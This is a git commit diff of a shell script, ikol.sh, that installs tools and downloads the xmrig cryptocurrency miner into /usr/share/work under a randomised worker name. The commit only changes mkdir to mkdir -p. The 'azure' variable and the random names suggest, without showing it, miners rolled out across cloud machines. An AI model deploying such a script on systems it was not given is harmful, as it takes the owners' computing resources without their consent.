e14dc1617ddf02d4022ae32f33267b5748760665
eccoder <55380821+eccoder@users.noreply.github.com>
2021-09-14 11:51:59 +0700

    Update ikol.sh

--- ikol.sh
+++ ikol.sh
@@ -4,8 +4,8 @@ VERSION=6.3.1
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 apt-get install -y git wget screen
-mkdir /usr/share
-mkdir /usr/share/work
+mkdir -p /usr/share
+mkdir -p /usr/share/work
 rm -r /usr/share/work/xmrig-$VERSION
 wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
 mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
